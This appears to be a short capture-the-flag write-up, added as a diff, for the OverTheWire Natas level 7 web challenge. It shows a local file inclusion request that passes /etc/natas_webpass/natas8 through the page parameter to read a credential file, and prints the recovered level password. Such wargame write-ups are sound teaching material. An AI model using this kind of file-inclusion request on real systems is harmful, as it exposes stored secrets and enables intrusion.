@@ -1,0 +1,17 @@
+In this level we can click on a "home" and "about" pages, nothing inteesting there, but if we take a look at the parameters
+on the url, we can see how it behavies: 
+
+	->http://natas7.natas.labs.overthewire.org/index.php?page=home
+	->http://natas7.natas.labs.overthewire.org/index.php?page=about 
+
+We look at the souce code of the page and we find:
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+
+So it's clear it wants us to do something like this:
+	
+	http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+And we get the password:
+	DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+
